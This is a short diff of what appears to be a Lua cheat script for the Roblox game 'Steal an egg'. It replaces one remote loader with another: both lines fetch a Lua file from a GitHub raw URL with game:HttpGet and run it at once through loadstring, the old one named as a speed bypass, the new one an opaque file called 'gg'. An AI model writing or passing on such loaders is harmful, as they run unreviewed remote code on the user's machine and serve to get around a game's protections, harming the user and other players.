@@ -1,5 +1,5 @@
 pcall(function(...)
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Lutosys/opensrc/refs/heads/main/stealaeggspeedbypass.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/BeVoltyn/Steal-an-egg/refs/heads/main/gg"))()
 end)
 
 local utility = {
